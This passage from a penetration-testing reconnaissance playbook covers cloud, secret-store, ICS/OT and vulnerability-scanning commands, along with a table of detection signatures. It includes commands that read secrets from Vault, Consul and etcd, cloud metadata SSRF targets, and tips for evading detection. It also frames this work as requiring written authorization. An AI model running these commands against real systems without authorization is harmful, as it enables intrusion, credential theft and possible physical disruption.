# CRITICAL: --owner-ids self returns YOUR snapshots, not target's.
# To find PUBLIC snapshots, use --restorable-by-user-ids all
aws ec2 describe-snapshots --restorable-by-user-ids all \
     --filters "Name=description,Values=*target*" \
     --region us-east-1 \
     --query 'Snapshots[*].[SnapshotId,Description,VolumeSize]'

# Or by known target account ID
aws ec2 describe-snapshots --owner-ids <TARGET_ACCT_ID> --region us-east-1

# ─── SCOUT SUITE / PROWLER (AUTHENTICATED MULTI-CLOUD) ─────
scout aws --report-dir scout_report/
prowler aws --output-formats html --output-directory prowler_report/

# ─── CLOUDFOX (POST-CRED EXPLOITATION RECON) ───────────────
cloudfox aws all-checks --profile target-profile
```

### 6.2 — Azure — Extended

```bash
# ═══════════════════════════════════════════════════════════
# AZURE TENANT VERIFICATION (cross-ref passive recon §7.3)
# MITRE ATT&CK: T1526
# NOISE LEVEL:  LOW
# ═══════════════════════════════════════════════════════════
# Existence + tenant ID discovery via OpenID configuration
curl -s "https://login.microsoftonline.com/target.com/.well-known/openid-configuration" | jq

# Federation status
curl -s "https://login.microsoftonline.com/getuserrealm.srf?login=user@target.com&xml=1"

# AADInternals outsider recon (cross-ref passive recon §7.3)
Invoke-AADIntReconAsOutsider -DomainName target.com

# ═══════════════════════════════════════════════════════════
# AZURE BLOB STORAGE
# ═══════════════════════════════════════════════════════════
# Pattern: <storage-account>.blob.core.windows.net (3-24 chars, lowercase + digits)
# Anonymous container listing only works if BOTH account AND container have
# anonymous access enabled — OFF by default since 2023
nslookup target.blob.core.windows.net
curl -sI "https://target.blob.core.windows.net/" | head
# Returns 400 InvalidQueryParameterValue = account exists (no container specified)

# List blobs in known container (anonymous)
curl -s "https://target.blob.core.windows.net/<container>?restype=container&comp=list"

# All Azure storage subdomain variants:
for variant in blob file queue table dfs; do
  nslookup target.${variant}.core.windows.net
done

# ═══════════════════════════════════════════════════════════
# AUTHENTICATED ENUMERATION (LOGGED TO ENTRA AUDIT + RESOURCE LOG)
# ═══════════════════════════════════════════════════════════
# Azure CLI
az login                                      # Browser device-flow
az account show
az account list-locations
az resource list --output table
az vm list --output table
az storage account list --output table
az keyvault list --output table
az role assignment list --all                 # IAM role assignments
az ad signed-in-user show

# AzureHound (SpecterOps) — v2.11.0+ March 2026
azurehound -u user@target.com -p 'pass' --tenant target.com list

# ROADtools / ROADrecon
roadrecon auth -u user@target.com -p 'pass'
roadrecon gather                              # Some tenant configs return 403
roadrecon gui

# MicroBurst (NetSPI — PowerShell Azure recon toolkit)
# https://github.com/NetSPI/MicroBurst
Invoke-EnumerateAzureBlobs -Base target
Invoke-EnumerateAzureSubDomains -Base target
Invoke-AzureRecon                             # Subscription enumeration with creds

# ═══════════════════════════════════════════════════════════
# MICROSOFT GRAPH (with token)
# ═══════════════════════════════════════════════════════════
curl -s "https://graph.microsoft.com/v1.0/me" -H "Authorization: Bearer $TOKEN" | jq
curl -s "https://graph.microsoft.com/v1.0/users?\$top=999" -H "Authorization: Bearer $TOKEN"
curl -s "https://graph.microsoft.com/v1.0/groups" -H "Authorization: Bearer $TOKEN"
curl -s "https://graph.microsoft.com/v1.0/applications" -H "Authorization: Bearer $TOKEN"
curl -s "https://graph.microsoft.com/v1.0/servicePrincipals" -H "Authorization: Bearer $TOKEN"
curl -s "https://graph.microsoft.com/v1.0/directoryRoles" -H "Authorization: Bearer $TOKEN"
curl -s "https://graph.microsoft.com/beta/policies/conditionalAccessPolicies" \
     -H "Authorization: Bearer $TOKEN"

# 2024-2025 weaponization: Storm-0501, Void Blizzard observed using
# AzureHound + Graph for lateral movement to cloud-hosted workloads.
# Source: Microsoft Security Blog Aug 2025 reporting
```

### 6.3 — GCP — Fully Expanded

```bash
# ═══════════════════════════════════════════════════════════
# GCS BUCKET DISCOVERY (LOW-TOUCH ACTIVE)
# MITRE ATT&CK: T1526
# NOISE LEVEL:  LOW
# ═══════════════════════════════════════════════════════════
# Pattern: storage.googleapis.com/<bucket>  OR  <bucket>.storage.googleapis.com
curl -s "https://storage.googleapis.com/target-bucket/"
curl -s "https://target-bucket.storage.googleapis.com/"
gsutil ls gs://target-bucket 2>/dev/null      # Anonymous listing if public

# Bulk pattern testing
for purpose in backup data logs assets prod dev staging; do
  for prefix in target target-corp target-prod; do
    curl -sI "https://storage.googleapis.com/${prefix}-${purpose}/" | head -1
  done
done

# ═══════════════════════════════════════════════════════════
# GCP PROJECT ID GUESSING
# ═══════════════════════════════════════════════════════════
# GCP project IDs are globally unique, lowercase, 6-30 chars, hyphens allowed
# Use Gobuster against storage.googleapis.com/<project> to identify
gobuster dir -u "https://storage.googleapis.com/" \
        -w /usr/share/seclists/Discovery/Cloud/gcp-buckets.txt -t 10

# ═══════════════════════════════════════════════════════════
# GCP CLOUD RUN / CLOUD FUNCTIONS
# ═══════════════════════════════════════════════════════════
# Pattern: <service>-<hash>-<region>.run.app
# CT log discovery (passive recon §1.2)
curl -s "https://crt.sh/?q=%25.run.app&output=json" | jq -r '.[].name_value' | grep -i target

# Cloud Functions URLs
# Pattern: https://<region>-<project>.cloudfunctions.net/<function>
curl -s "https://crt.sh/?q=%25.cloudfunctions.net&output=json" | grep -i target

# ═══════════════════════════════════════════════════════════
# WITH GCP CREDS — AUTHENTICATED ENUMERATION
# (LOGGED TO CLOUD AUDIT LOGS — Admin Activity + Data Access)
# ═══════════════════════════════════════════════════════════
gcloud auth login                             # Browser auth flow
gcloud auth list
gcloud config list
gcloud projects list                          # All projects accessible
gcloud projects describe <project>            # Project detail
gcloud iam service-accounts list --project=<project>
gcloud iam roles list --project=<project>
gcloud compute instances list --project=<project>
gcloud compute networks list --project=<project>
gcloud functions list --project=<project>
gcloud run services list --project=<project>
gcloud sql instances list --project=<project>
gcloud container clusters list --project=<project>  # GKE
gcloud secrets list --project=<project>             # Secret Manager

# IAM impersonation chains
gcloud auth print-access-token --impersonate-service-account=<sa>@<project>.iam.gserviceaccount.com

# Workload Identity Federation — federation between GCP and external IdPs
gcloud iam workload-identity-pools list

# ═══════════════════════════════════════════════════════════
# GCP RECON TOOLING
# ═══════════════════════════════════════════════════════════
# gcp_enum (RhinoSecurityLabs) — IAM permission enumeration
# https://github.com/RhinoSecurityLabs/GCP-IAM-Privilege-Escalation
python3 gcp_enum.py --keyfile <sa.json> --project <project>

# GCPBucketBrute — bulk bucket guessing
# https://github.com/RhinoSecurityLabs/GCPBucketBrute

# ScoutSuite (multi-cloud) — also covers GCP
scout gcp --service-account <sa.json> --report-dir scout_report/

# Prowler (multi-cloud)
prowler gcp --gcp-credentials-file <sa.json>
```

### 6.4 — Kubernetes (cross-ref §3.8 corrected framing)

(See §3.8 for kubelet vs API-server defaults clarification and full endpoint enumeration.)

### 6.5 — Container Registries (cross-ref passive recon §5.5 + §8.5)

(See passive recon §5.5 for cross-platform registry enumeration; §8.5 of this doc for active probing.)

### 6.6 — Secret Stores (Vault / Consul / Etcd)

```bash
# ═══════════════════════════════════════════════════════════
# HASHICORP VAULT (8200)
# MITRE ATT&CK: T1083, T1552 (Unsecured Credentials)
# NOISE LEVEL:  LOW (status probe) to MEDIUM (auth probe)
# ═══════════════════════════════════════════════════════════
# Vault status (anonymous endpoint)
curl -s "http://<target>:8200/v1/sys/health" | jq
curl -s "http://<target>:8200/v1/sys/seal-status" | jq
curl -s "http://<target>:8200/v1/sys/leader" | jq

# Vault auth methods enumeration (anonymous)
curl -s "http://<target>:8200/v1/sys/auth" | jq

# Vault mount enumeration (auth required)
curl -s "http://<target>:8200/v1/sys/mounts" -H "X-Vault-Token: $VAULT_TOKEN" | jq

# Vault secret read (auth + path required)
curl -s "http://<target>:8200/v1/secret/data/<path>" -H "X-Vault-Token: $VAULT_TOKEN" | jq

# Common misconfigurations:
#   - Initialized=false / sealed=true → prepare for unseal abuse
#   - Auth method = none enabled (rare but devastating)
#   - root token still in use (CRITICAL — full Vault control)

# ═══════════════════════════════════════════════════════════
# HASHICORP CONSUL (8500 HTTP API, 8600 DNS)
# MITRE ATT&CK: T1046, T1083
# ═══════════════════════════════════════════════════════════
curl -s "http://<target>:8500/v1/agent/members" | jq
curl -s "http://<target>:8500/v1/catalog/services" | jq
curl -s "http://<target>:8500/v1/catalog/nodes" | jq
curl -s "http://<target>:8500/v1/kv/?recurse=true" | jq  # Key-value store
curl -s "http://<target>:8500/v1/connect/intentions" | jq

# Consul KV often holds: API tokens, database creds, application config

# ═══════════════════════════════════════════════════════════
# ETCD (2379 client, 2380 peer)
# MITRE ATT&CK: T1083
# ═══════════════════════════════════════════════════════════
# Etcd version
curl -sk "https://<target>:2379/version"

# List all keys (UNAUTH-accessible misconfig is critical — etcd backs K8s)
etcdctl --endpoints=http://<target>:2379 get / --prefix --keys-only

# K8s-specific etcd paths (if etcd is K8s backend)
etcdctl --endpoints=http://<target>:2379 get /registry/secrets --prefix
etcdctl --endpoints=http://<target>:2379 get /registry/configmaps --prefix

# Etcd v3 API direct
curl -sk "https://<target>:2379/v3/kv/range" -X POST -d '{"key":"AA=="}'

# Modern K8s etcd (since v1.13) requires mTLS by default; legacy clusters
# / standalone etcd often unauthenticated
```

### 6.7 — Multi-Cloud Audit (with credentials)

```bash
# ═══════════════════════════════════════════════════════════
# SCOUTSUITE (NCC GROUP — multi-cloud audit)
# Confirmed maintained: https://github.com/nccgroup/ScoutSuite
# ═══════════════════════════════════════════════════════════
scout aws   --report-dir scout_aws/
scout azure --report-dir scout_azure/
scout gcp   --service-account <sa.json> --report-dir scout_gcp/
scout aliyun --report-dir scout_aliyun/

# ═══════════════════════════════════════════════════════════
# PROWLER (multi-cloud, AWS-focused)
# https://github.com/prowler-cloud/prowler
# ═══════════════════════════════════════════════════════════
prowler aws --compliance cis_2.0_aws
prowler azure
prowler gcp --gcp-credentials-file <sa.json>
prowler kubernetes --kubeconfig <path>

# ═══════════════════════════════════════════════════════════
# CLOUDFOX (Bishop Fox — post-cred AWS exploitation recon)
# https://github.com/BishopFox/cloudfox
# ═══════════════════════════════════════════════════════════
cloudfox aws all-checks --profile target-profile

# ═══════════════════════════════════════════════════════════
# PACU (Rhino Security — AWS exploitation framework)
# https://github.com/RhinoSecurityLabs/pacu
# ═══════════════════════════════════════════════════════════
pacu                                          # Interactive shell
# Modules: iam__bruteforce_permissions, iam__enum_users_roles_policies_groups,
#          ec2__enum, lambda__enum, s3__enum, etc.

# ═══════════════════════════════════════════════════════════
# CLOUD METADATA SERVICE FINGERPRINTS (when behind SSRF)
# ═══════════════════════════════════════════════════════════
# AWS IMDSv1: http://169.254.169.254/latest/meta-data/
# AWS IMDSv2 (mandatory new EC2 since 2024):
#   curl -s -H "X-aws-ec2-metadata-token: $TOKEN" http://169.254.169.254/...
#   Token from: PUT http://169.254.169.254/latest/api/token
# GCP: http://metadata.google.internal/computeMetadata/v1/
#   Header: Metadata-Flavor: Google
# Azure IMDS: http://169.254.169.254/metadata/instance?api-version=2021-02-01
#   Header: Metadata: true
# Oracle Cloud (OCI): http://169.254.169.254/opc/v2/instance/
# Alibaba Cloud: http://100.100.100.200/latest/meta-data/
```

```
═══════════════════════════════════════════════════════════
SECTION 6 — RELATED & FOLLOW-ON
═══════════════════════════════════════════════════════════
Enables → §03 Initial Access (cloud creds = direct console / API access)
Enables → §06 Lateral Movement (cross-account / cross-tenant pivot)
Prereq → Passive recon §7 (cloud provider identification + tenant ID + account)
Cross-ref → §3.11 identity-plane (identity overlaps with cloud auth)
Cross-ref → §3.8 K8s (Kubernetes is the major orchestration cloud-side)
Cross-ref → §3.16 internal package registries (artifact + container)
```

---

## 7 — ICS / OT DISCOVERY

> **CRITICAL OPSEC + LEGAL FRAMING:** ICS/OT recon is dangerous. Wrong probe at wrong moment can BRICK a PLC, halt a power generator, or cause physical harm. NEVER probe production ICS without explicit Rules-of-Engagement authorization AND coordination with the operator. Volt Typhoon (CISA AA24-038A and AA26-113a) targets US critical infrastructure; defenders are highly attuned to ICS-protocol traffic from non-engineering subnets. ICS scanners are SAFER on test/lab/Conpot honeypots; ALWAYS verify environment before probing.
>
> **Typical chains:** Network identification of OT segment → protocol fingerprint (Modbus/DNP3/etc.) → device enumeration (PLC vendor, firmware version) → CVE matching → handoff to specialized ICS exploitation (out of scope here).

### 7.1 — Modbus (502 TCP)

```bash
# ═══════════════════════════════════════════════════════════
# MODBUS — INDUSTRY-STANDARD ICS/OT PROTOCOL
# MITRE ATT&CK: T1046, T0846 (ICS: Remote System Discovery)
# NOISE LEVEL:  LOW probe; CRITICAL impact if WRITE attempted
# ═══════════════════════════════════════════════════════════
# Modbus probe (read function code 1 — Read Coils)
nmap -p 502 --script=modbus-discover <target>
# Returns: device-ID, vendor-name, product-code, version, etc.

# modscan / modpoll — manual Modbus interaction (READ-ONLY)
modscan <target> 502
modpoll -m tcp -t 4 -r 1 -c 10 <target>      # Read 10 holding registers

# WRITE operations are PHYSICAL CHANGES (open valve, change setpoint, etc.)
# NEVER WRITE without explicit RoE
```

### 7.2 — DNP3 (20000 TCP/UDP)

```bash
# ═══════════════════════════════════════════════════════════
# DNP3 — DISTRIBUTED NETWORK PROTOCOL 3 (US power grid + utilities)
# MITRE ATT&CK: T1046, T0846
# ═══════════════════════════════════════════════════════════
nmap -p 20000 --script=dnp3-info <target>
# Tools: opendnp3 library / Python projects for client implementations
```

### 7.3 — EtherNet/IP (44818 TCP, 2222 UDP)

```bash
# ═══════════════════════════════════════════════════════════
# ETHERNET/IP — Allen-Bradley / Rockwell Automation primary protocol
# MITRE ATT&CK: T1046, T0846
# ═══════════════════════════════════════════════════════════
nmap -p 44818,2222 --script=enip-info <target>
# Reveals: vendor, product code, serial number, firmware version

# CIPstation tool — Common Industrial Protocol scanning
# https://github.com/Bashis/CIPstation
```

### 7.4 — OPC UA (4840)

```bash
# ═══════════════════════════════════════════════════════════
# OPC UA — modern interoperable industrial protocol
# MITRE ATT&CK: T1046
# ═══════════════════════════════════════════════════════════
nmap -p 4840 --script=opcua-* <target>
# Tools: opcua-asyncio Python library, uacli CLI
```

### 7.5 — BACnet (47808 UDP)

```bash
# ═══════════════════════════════════════════════════════════
# BACnet — BUILDING AUTOMATION (HVAC, lighting, security)
# MITRE ATT&CK: T1046
# ═══════════════════════════════════════════════════════════
nmap -p 47808 --script=bacnet-info <target>
# Multicast discovery
nmap -sU -p 47808 --script=broadcast-bacnet-discover -e eth0
```

### 7.6 — Siemens S7 (102 TCP)

```bash
# ═══════════════════════════════════════════════════════════
# SIEMENS S7 — Siemens SIMATIC PLC family
# MITRE ATT&CK: T1046, T0846
# Stuxnet's primary protocol target
# ═══════════════════════════════════════════════════════════
nmap -p 102 --script=s7-info <target>
# Tools: Snap7 library (Python wrapper python-snap7)

# PROFINET (UDP 34962-34964 + TCP 34962)
nmap --script=profinet-cm-lookup -e eth0      # Discovery
```

### 7.7 — IEC 61850 GOOSE/MMS (102 TCP for MMS, multicast for GOOSE)

```bash
# ═══════════════════════════════════════════════════════════
# IEC 61850 — modern substation automation (electrical utilities)
# MITRE ATT&CK: T1046
# ═══════════════════════════════════════════════════════════
nmap -p 102 --script=iec-identify <target>    # MMS port
# GOOSE: Layer 2 multicast — requires capture, not scan
sudo tcpdump -i eth0 ether proto 0x88b8       # GOOSE Ethertype

# ICCP (IEC 60870-6 / TASE.2) — utility-to-utility (102 TCP, 3022 secure)
nmap -p 102,3022 -sV <target>
```

### 7.8 — HART-IP / PROFINET / IEC 60870-5

```bash
# ═══════════════════════════════════════════════════════════
# HART-IP (5094 TCP/UDP) — process-instrumentation protocol
# Nmap 7.95 added hartip-info NSE script
# ═══════════════════════════════════════════════════════════
nmap -p 5094 --script=hartip-info <target>

# IEC 60870-5-104 (2404 TCP) — utility SCADA
nmap -p 2404 --script=iec-identify <target>

# CC-Link IE / EtherCAT / Modbus RTU over TCP — vendor-specific variants
```

### 7.9 — Tools + Honeypot Recognition

```bash
# ═══════════════════════════════════════════════════════════
# ICS-SPECIFIC TOOLING
# ═══════════════════════════════════════════════════════════
# PLCScan — multi-protocol PLC scanner
# https://github.com/yanlinlin82/plcscan (legacy but still functional)
plcscan.py <target>

# Nmap NSE ICS scripts (Nmap 7.95+):
#   modbus-discover, dnp3-info, enip-info, s7-info, opcua-discover-services,
#   bacnet-info, hartip-info, profinet-cm-lookup, iec-identify

# Conpot — honeypot for SCADA (defender-side)
# https://github.com/mushorg/conpot
# Recognize Conpot via specific banner patterns + response timing
# Operator MUST verify NOT scanning a honeypot; canary-token auth may
# alert defender team within seconds

# T-Pot / Honeyd / Cowrie — multi-honeypot stacks
# Recognize via:
#   - Inconsistent OS fingerprint (e.g., Modbus on a "Cisco IOS" banner)
#   - Suspiciously perfect responses to all queried object IDs
#   - Reverse DNS / WHOIS pointing to security research orgs

# ═══════════════════════════════════════════════════════════
# VOLT TYPHOON / KV BOTNET CONTEXT (CISA AA26-113a, April 2026)
# ═══════════════════════════════════════════════════════════
# US critical infra targeting: power, water, transportation
# Pre-positioning for potential disruption (5+ year footholds documented)
# Living-off-the-land via valid accounts
# KV Botnet exploits EOL Cisco / NetGear routers as relay infrastructure
# Source: https://www.cisa.gov/news-events/cybersecurity-advisories/aa26-113a
```

```
═══════════════════════════════════════════════════════════
SECTION 7 — RELATED & FOLLOW-ON
═══════════════════════════════════════════════════════════
Enables → ICS-specific exploitation (out of scope this doc; specialized refs)
Prereq → §1 host discovery + §2 port scan in OT segment
Cross-ref → §3.19 BAS / building automation (BACnet overlap)
WARNING → ICS protocols are FRAGILE; specifically AVOID Nessus/OpenVAS/
          Qualys default profiles which can crash PLCs. Use Tenable's
          ICS-specific compliance plugins or specialized OT scanners
          (Claroty, Nozomi, Dragos, Tenable.ot)
```

---

## 8 — VULNERABILITY SCANNING

> **Typical chains through this section:** Open ports + service versions from §2-§3 → Nuclei v3 templated probes by tag → Edge-appliance CVE matrix from §4.8 → exploit availability check → handoff to exploitation phase. NEVER run vuln scanners against ICS/OT segments unless using ICS-specialized scanner.

### 8.1 — Nuclei v3

```bash
# ═══════════════════════════════════════════════════════════
# NUCLEI v3 — TEMPLATE-BASED VULN SCANNER
# MITRE ATT&CK: T1595.002 (Active Scanning: Vulnerability Scanning)
# NOISE LEVEL:  HIGH (per template = many HTTP requests); WAF rate-limit
# ═══════════════════════════════════════════════════════════
# Update templates (templates v9 schema in 2026)
nuclei -update-templates
nuclei -update                                # Update binary

# Single target — critical/high CVEs only
nuclei -u https://target.com -t cves/ -severity critical,high -silent

# Default-credential scanning
nuclei -u https://target.com -t default-logins/ -silent

# Exposure / config disclosure
nuclei -u https://target.com -t exposures/ -silent

# Misconfiguration
nuclei -u https://target.com -t misconfiguration/ -silent

# Multi-target with rate limiting (essential for stealth)
nuclei -l urls.txt -t cves/ -t default-logins/ -t exposures/ \
       -rl 50 -c 10 -silent -o nuclei_results.txt

# Technology-targeted (edge-appliance CVE matrix from §4.8)
nuclei -u https://target.com \
       -tags ivanti,fortinet,citrix,paloalto,f5,sonicwall,sophos,cisco

# CI/CD + management
nuclei -u https://target.com \
       -tags veeam,vcenter,exchange,confluence,jenkins,teamcity,gitlab

# Cloud native
nuclei -u https://target.com -tags k8s,docker,aws,azure,gcp

# AI-assisted template generation (added 2024+):
nuclei -ai "Detect CVE-2025-XXXXX in Acme product" -u https://target.com

# OPSEC: Nuclei User-Agent is identifiable; rotate
nuclei -u https://target.com -H "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"

# Custom template authoring (basic schema):
# templates/custom/myapp-cve.yaml:
# id: myapp-cve-detection
# info:
#   name: Detect MyApp CVE-2026-XXXX
#   severity: high
#   tags: cve,2026,myapp
# requests:
#   - method: GET
#     path:
#       - "{{BaseURL}}/vulnerable-endpoint"
#     matchers:
#       - type: word
#         words:
#           - "vulnerable response signature"
```

### 8.2 — Nmap NSE (Vulnerability Scripts)

```bash
# ═══════════════════════════════════════════════════════════
# NMAP NSE VULN SCRIPTS — TARGETED DETECTION
# MITRE ATT&CK: T1595.002
# NOISE LEVEL:  MEDIUM-HIGH; NSE probes have distinctive patterns
# ═══════════════════════════════════════════════════════════
# All vuln scripts (broad)
nmap --script=vuln -p <ports> <target>

# Exclude DoS scripts (default-safe vuln scanning)
nmap --script="*vuln* and not dos" <target>

# Service-specific vuln checks
nmap --script=smb-vuln* -p 445 <target>       # All SMB vulns
nmap --script=http-vuln* -p 80,443 <target>   # All HTTP vulns
nmap --script=ssl-* -p 443 <target>           # SSL/TLS issues

# Nmap 7.95+ ICS-specific scripts (use ONLY against test/lab — see §7)
nmap --script=hartip-info -p 5094 <target>
nmap --script=profinet-cm-lookup -e eth0
nmap --script=s7-info -p 102 <target>

# Latest CVE scripts as of 2026 (sample selection):
#   smb-vuln-cve-2020-0796 (SMBGhost — legacy)
#   http-vuln-cve2017-5638 (Struts2 — legacy)
#   smb-vuln-ms17-010 (EternalBlue — perpetual)
#   http-vuln-cve2022-26134 (Confluence)
```

### 8.3 — Edge-Appliance CVE Matrix (cross-ref §4.8)

(See §4.8 for the canonical 2024-2026 CVE quick-recognition matrix and Nuclei tag selection.)

### 8.4 — Commercial Scanners

```
═══════════════════════════════════════════════════════════
COMPREHENSIVE / COMMERCIAL VULN SCANNERS
═══════════════════════════════════════════════════════════

NESSUS (Tenable — most comprehensive; commercial license)
  - Web UI: https://localhost:8834
  - Plans: Essentials (free, 16 IPs), Professional (paid, unlimited)
  - Scan templates: Basic Network, Advanced Network, Web Application,
    Compliance Audit, ICS / SCADA (use this for OT — NOT default profiles)
  - Credentialed scans: SSH/SMB/WinRM/Database creds for deeper inspection
  - DETECTION: Distinctive User-Agent ("Tenable, Inc"); thousands of probes
    per host; immediate detection by all modern WAF/IDS/EDR
  - OPSEC: Use ONLY with explicit RoE; NEVER against external targets
    without written authorization

QUALYS VMDR (Vulnerability Management, Detection and Response)
  - Cloud-hosted; agent-based or scanner-appliance-based
  - Same detection profile as Nessus
  - Compliance-focused output

RAPID7 INSIGHTVM (formerly Nexpose)
  - Console + scan engines (cloud or on-prem)
  - InsightVM platform integrates with Metasploit Pro

OPENVAS / GREENBONE COMMUNITY EDITION (free + paid Greenbone Enterprise)
  - Modern syntax: greenbone-feed-sync (NOT openvas-feed-update)
  - Web UI (GSA): https://localhost:9392
  - Kali helper: gvm-start
  - Non-Kali: systemctl start ospd-openvas gvmd gsad
  - Lower-quality plugin coverage than Nessus but free
  - Scan engines slower than commercial alternatives

DETECTION/OPSEC for ALL commercial scanners:
  - Identifiable User-Agent strings
  - Probe patterns recognizable to every major IDS/WAF/EDR
  - Per-target probe count: thousands (vs Nuclei's tens)
  - IMMEDIATELY DETECTED by mature SOC; instant block + investigation
  - INTERNAL USE ONLY; coordinate with target SOC if running for compliance
  - Run during business hours from a SOC-known scanner IP
  - NEVER against ICS/OT default profiles — use ICS-specialized scanners
    (Claroty, Nozomi, Dragos, Tenable.ot)
```

### 8.5 — Container Vulnerability Scanning

```bash
# ═══════════════════════════════════════════════════════════
# CONTAINER IMAGE / SBOM VULN SCANNING
# MITRE ATT&CK: T1595.002
# NOISE LEVEL:  LOW (offline analysis)
# ═══════════════════════════════════════════════════════════
# Trivy (Aqua Security — most popular)
trivy image target-org/image:tag
trivy image --severity HIGH,CRITICAL target-org/image:tag
trivy fs ./repo                               # Filesystem scan
trivy config ./terraform                      # IaC scan
trivy k8s --report=summary cluster

# Grype (Anchore — alternative to Trivy)
grype target-org/image:tag

# Syft (Anchore — SBOM generator)
syft target-org/image:tag -o cyclonedx-json

# Clair (CoreOS / RedHat — older)
# Now part of Quay; less standalone use

# DOCKER SCOUT (Docker Inc.)
docker scout cves target-org/image:tag
docker scout recommendations target-org/image:tag
```

### 8.6 — Exploit Availability Check

```bash
# ═══════════════════════════════════════════════════════════
# AFTER IDENTIFYING VERSIONS, CHECK FOR AVAILABLE EXPLOITS
# ═══════════════════════════════════════════════════════════
# searchsploit (local Exploit-DB mirror)
searchsploit <product> <version>
searchsploit -m <exploit_id>                  # Mirror exploit locally
searchsploit --update

# Metasploit
msfconsole -q -x "search type:exploit <product>; exit"
msfconsole -q -x "search cve:CVE-2024-XXXXX; exit"

# CISA Known Exploited Vulnerabilities (KEV) Catalog
curl -s "https://www.cisa.gov/sites/default/files/feeds/known_exploited_vulnerabilities.json" | jq

# vulncheck-kev (community CLI for CISA KEV + VulnCheck KEV)
# https://github.com/vulncheck-oss/cli
vulncheck kev --search-cve CVE-2024-XXXXX

# CVE_Prioritizer (TURROKS — risk-scoring helper)
# https://github.com/TURROKS/CVE_Prioritizer
python3 cve_prioritizer.py -c CVE-2024-XXXXX

# GitHub PoC search
# https://github.com/search?q=CVE-2024-XXXXX+PoC&type=repositories

# Nuclei templates by CVE-ID (often fastest verification)
nuclei -tags cve2024 -severity critical,high -u https://target.com

# ALWAYS review exploit code before running. Public PoCs sometimes:
# - Contain backdoored payloads (operator-attacker honey trap)
# - Don't actually do what they claim (low-quality scrap)
# - Trigger unintended side effects (DoS instead of RCE)
# - Are intentionally bricked to delay automated mass exploitation

# ═══════════════════════════════════════════════════════════
# AI-ASSISTED RECON (EMERGING — limited public validation)
# ═══════════════════════════════════════════════════════════
# PentestGPT — LLM-orchestrated pentesting workflow
# https://github.com/GreyDGL/PentestGPT
# Useful as accelerator; output requires operator verification
# Not a replacement for tradecraft; LLMs frequently hallucinate exploit chains

# HackingBuddyGPT — LLM-driven Linux exploitation experimentation
# https://github.com/ipa-lab/hackingBuddyGPT

# Nuclei v3 AI templates — generate detection templates via prompt
# Quality varies significantly by complexity; verify generated templates
```

```
═══════════════════════════════════════════════════════════
SECTION 8 — RELATED & FOLLOW-ON
═══════════════════════════════════════════════════════════
Enables → §03 Initial Access (vulnerability identified → exploit dev / use)
Enables → §05 Privilege Escalation (privesc CVEs)
Prereq → §1-§4 service/version inventory
Cross-ref → §4.8 edge-appliance CVE matrix
Cross-ref → §3.10 Backup/Mgmt CVEs (Veeam / vCenter / etc.)
NEVER → Run Nessus/OpenVAS/Qualys against ICS without specialized profile
        Run external scanners without explicit engagement RoE
```

---

## 9 — OPSEC & DETECTION REFERENCE

```
═══════════════════════════════════════════════════════════
ACTIVE-RECON DETECTION SIGNATURES (UPDATED 2026 BASELINE)
═══════════════════════════════════════════════════════════
TECHNIQUE                  │ NOISE      │ KEY DETECTION         │ TYPICAL RESPONSE
───────────────────────────┼────────────┼───────────────────────┼─────────────────
DNS brute force            │ MEDIUM     │ DNS query volume      │ Rate-limit, log
ARP scan local subnet      │ NEAR-ZERO  │ NAC behavioral        │ Rarely alerted
Responder -A passive       │ NEAR-ZERO  │ None (receive-only)   │ No detection
ICMP ping sweep            │ MEDIUM     │ IDS sig + NDR         │ Log + alert
TCP SYN slow (-T1)         │ LOW-MED    │ FW conn logs          │ May go unnoticed
TCP SYN fast (-T4+)        │ HIGH       │ IDS port-scan sig     │ Block source IP
Nmap full -p- scan         │ VERY HIGH  │ 65K SYN/host          │ Immediate block
Nmap -sV version detect    │ MEDIUM     │ Banner-grab patterns  │ Log
Nmap -sC default scripts   │ MED-HIGH   │ NSE probe sigs        │ WAF/IDS alert
Naabu fast SYN             │ HIGH       │ Fan-out from src IP   │ Block
Masscan / ZMap             │ EXTREME    │ SYN flood appearance  │ DDoS-mitigation
Kerbrute userenum          │ HIGH       │ MDI alert (high-fid)  │ Auto-contain
Kerberoasting bulk TGS     │ HIGH       │ MDI alert (high-fid)  │ Auto-contain
LDAP bulk query            │ MEDIUM     │ MDI Recon-via-DSA     │ Alert + log
NetExec --shares brute     │ MEDIUM     │ 4624/4625 events      │ Log + threshold
Dirbust (default UA)       │ HIGH       │ 404 spike + WAF UA    │ WAF block
Nuclei (default UA)        │ HIGH       │ HTTP probe burst      │ WAF block
Nessus / OpenVAS / Qualys  │ EXTREME    │ Thousands of probes   │ Immediate block
HTTP request smuggling     │ MEDIUM     │ Modern WAF specific   │ Log
GraphQL bulk introspection │ MEDIUM     │ App-side rate-limit   │ Log
gRPC reflection probe      │ LOW        │ rare detection        │ Log
JWT alg=none probe         │ LOW        │ App-side validation   │ Log
Cloud unauth probes        │ LOW        │ CSPM (Wiz / Lacework) │ Alert
Cloud authenticated enum   │ MEDIUM     │ CloudTrail / Activity │ Always logged
K8s kubelet anon probes    │ LOW-MED    │ K8s audit log if on   │ Variable
ICS Modbus probe           │ HIGH       │ ICS-aware NDR         │ Immediate alert
Edge-appliance CVE probes  │ MEDIUM     │ Vendor-specific WAF   │ Block + alert
Edge-appliance brute       │ HIGH       │ Vendor IDS + cloud    │ Immediate block

NOTE: Noise + detection are OPERATOR ASSESSMENTS based on typical 2026
enterprise baseline (MDE/MDI/MDCA/Sentinel + NDR + CSPM + WAF + 24/7 SOC).
Actual detectability depends on per-tenant config + baselining maturity.
```

```
═══════════════════════════════════════════════════════════
DEFENDER STACK — WHAT EACH PRODUCT SEES
═══════════════════════════════════════════════════════════
ENDPOINT (host telemetry):
  Microsoft Defender for Endpoint (MDE)
    Sees: Process tree, file-system events, network connections (per-host),
          registry events, ETW Threat Intelligence provider (kernel),
          AMSI inspection results
    Misses: Network behavior across multiple hosts (XDR layer adds this)

  CrowdStrike Falcon
    Sees: Same primitives as MDE; different sensor design (driver-based);
          stronger behavioral classification
    Misses: Identity events (separate Falcon Identity)

  SentinelOne Singularity
    Sees: Per-host process / file / network / registry; Storyline (causal
          graph) reconstructs attack chains
    Misses: Identity-plane (separate S1 Identity)

IDENTITY (DC traffic + Entra signals):
  Microsoft Defender for Identity (MDI)
    Sees: ALL DC network traffic (Kerberos, LDAP, NTLM, SAMR, DCSync,
          DCShadow, replication); flags 30+ named attack patterns
    Specific high-fidelity alerts:
      - Suspected user enumeration
      - Suspected AS-REP Roasting
      - Suspected Kerberos SPN exposure (Kerberoasting)
      - Suspected DCSync attack (replication of directory services)
